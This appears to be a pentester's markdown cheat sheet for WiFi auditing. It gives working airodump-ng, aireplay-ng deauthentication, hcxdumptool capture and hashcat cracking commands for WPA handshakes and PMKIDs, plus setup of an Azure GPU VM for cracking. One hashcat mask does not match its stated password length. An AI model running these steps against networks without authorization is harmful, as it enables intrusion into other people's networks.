# WiFi Auditing

1. WiFi Hacking Techniques
   - Cracking hashes extracted from WIFI traffic
     - 4-way Handshake - good old way of getting the info, but need to be patient or injects packets in the network to deauth existing hosts
	 - PMKID - easy to grab the hash from the air, but not all APs are advertising it
   - WPS vulnerability - practically extinct

## Tooling

How-to for most common tooling

## Airmon-ng

Old way good way is trusty **airmon-ng**, which can be found in any Kali. Advantage is you can see what is happening, but it requires more work to extract the info.

First kill or processes which could tamper with monitoring device
```
sudo airmon-ng check kill
```

Put the wireless network device into monitor mode
```
sudo airmon-ng start wlan0
```

Listen for all nearby beacon frames to get a good ovewview of available BSSIDs and channels. You want to have good signal to have succesfull interactions with the AP. I wouldn't go lower than -60dB
```
sudo airodump-ng wlan0mon

68:8F:2E:xx:xx:xx  -47  24      141     3076   34   6  195   WPA2 CCMP   PSK  Wifi1   
F0:F2:49:xx:xx:xx  -82   1        0       30    0   1  195   WPA2 CCMP   PSK  Wifi2     
D4:B9:2F:xx:xx:xx  -69  74      245        0    0  11  130   WPA2 CCMP   PSK  WifiX
```

Start listening for handshake from picked BSSID (Wifi1), save the result into wifi folder
```
sudo airodump-ng -c 11 --bssid 68:8F:2E:xx:xx:xx -w wifi/ wlan0mon
```

If you are brave enough, you can deauth a connected client to force a handshake
```
sudo aireplay-ng -0 2 -a 68:8F:2E:xx:xx:xx -c 64:BC:0C:xx:xx:xx wlan0mon
```

Last step is to crack it with aircrack-ng using rockyou.txt
```
aircrack-ng -a2 -b 68:8F:2E:xx:xx:xx -w rockyou.txt wifi/01.cap
```

Or even better use **hashcat** - faster, utilizes GPU, more configurable

First convert cap to hccapx format
```
./cap2hccapx 01.cap Wifi1.hccapx SSID_name
```
Grab the cap2hccapx from https://github.com/hashcat/hashcat-utils

And let hashcat do the job cracking for you.
```
hashcat -w 3 -m 2500 Wifi.hccapx -o cracked.txt rockyou.txt -O
```

If you need to do hard bruteforce, hashcat can help as well. This is for 8 char password, which consist just form numbers
```
hashcat -w 3 -m 2500 -a 3 -o results.txt Wifi.hccapx ?d?d?d?d?d?d?d?d?d?d
```

We can specify how the password looks like if we have some clues - this is for [A-Za-z][a-z]{3}[12][0-9]{3}
```
hashcat  -w 3 -m 2500 -1 ?u?l -2 12 -a 3  -o results.txt numbers_crack.hccapx ?1?l?l?l?2?d?d?d
```

## hcxdumptool 

Newer and more user friendly WiFi information extraction tool. It can gather EAPOL handshake (4-way handshake or PMKID). If you are  brave, you can delete ```--disable_client_attacks``` and ```--disable_ap_attacks```. Also you can run it through multiple channels, but I prefer to be as specific as possible.
```
sudo systemctl restart NetworkManager.service
sudo hcxdumptool -c 6 -i wlan0 -o export.pcapng --enable_status=1 --error_max=200 --disable_client_attacks --disable_ap_attacks

initialization...

start capturing (stop with ctrl+c)
NMEA 0183 SENTENCE........: N/A
INTERFACE NAME............: wlan0
INTERFACE HARDWARE MAC....: 44850017205a
DRIVER....................: iwlwifi
DRIVER VERSION............: 5.4.0-kali2-amd64
DRIVER FIRMWARE VERSION...: 36.8fd77bb3.0
ERRORMAX..................: 200 errors
BPF code blocks...........: 0
FILTERLIST ACCESS POINT...: 0 entries
FILTERLIST CLIENT.........: 0 entries
FILTERMODE................: unused
WEAK CANDIDATE............: 12345678
ESSID list................: 0 entries
ROGUE (ACCESS POINT)......: 6096205a5740 (BROADCAST HIDDEN)
ROGUE (ACCESS POINT)......: 609620005741 (BROADCAST OPEN)
ROGUE (ACCESS POINT)......: 6096205a5742 (incremented on every new client)
ROGUE (CLIENT)............: b025aaea02f3
EAPOLTIMEOUT..............: 20000 usec
REPLAYCOUNT...............: 65197
ANONCE....................: 68030ad24f0da842f714aa02a9a1c57c4501c666448d6788b0bf96c92f46a6a2
SNONCE....................: 89d2c61670f7f41c61dff96d6c863c2e004f5495f26c4f601d5bc1bfea7443eb

11:56:16   6 abcdef123456 00fc8d95c698 SSID_name_1 [EAPOL:M1M2 EAPOLTIME:6408 RC:3 KDV:2]
12:00:52   6 bcdef1234567 1cabc0634328 SSID_name_2 [EAPOL:M2M3 EAPOLTIME:3055 RC:2 KDV:2]
12:21:36   6 cdef12345678 00fc8d25cc18 SSID_name_3 [EAPOL:M2M3 EAPOLTIME:3185 RC:2 KDV:2]
```

Using the hcxpcaptool to extract the hashes from pcapng. Extract as 2500 EAPOL 16800 PMKID. Or you can use cap2hccapx as used before, but you need to resave the pcapng as pcap.
```
./hcxpcaptool -z SSID_name_1.16800 export.pcapng
```
Grab the hcxpcaptool from https://github.com/ZerBea/hcxtools

Use Hashcat password cracking tool to obtain the WPA PSK (Pre-Shared Key) password
```
hashcat -m 16800 SSID_name_1.16800 -o results.txt  -a 3 -w 3 '?l?l?l?l?l?lt!'
```

## Azure Hashing Power

The deployment will create an Ubuntu Server 18.10 LTS instance on an Azure NV-series virtual machine. You need to fill in your details in the paramters file to reflect your AZ subscription.

Than run this command in Cloudshell of yours AZ Subscribtion
```
az deployment group create --resource-group hash_east --template-uri https://raw.githubusercontent.com/tomas-kabrt/PenTesting/master/vm_template.json --parameters https://raw.githubusercontent.com/tomas-kabrt/PenTesting/master/vm_template.parameters.json
```

Let's connect to the machine using putty or ssh and download and install grid drivers and hashcat
```
wget https://raw.githubusercontent.com/tomas-kabrt/PenTesting/master/azure_hashcat_preparation.sh
chmod +x azure_hashcat_preparation.sh
sudo ./azure_hashcat_preparation.sh
```

Now you are ready for cracking. I am recommending to make session persistent (screen), so it contiue crunching even when you are disconnected
```
screen
hashcat -w 3 -o results.txt -m 16800 -a 3 a.16800 ?H?H?H?H?H?H?H?H
```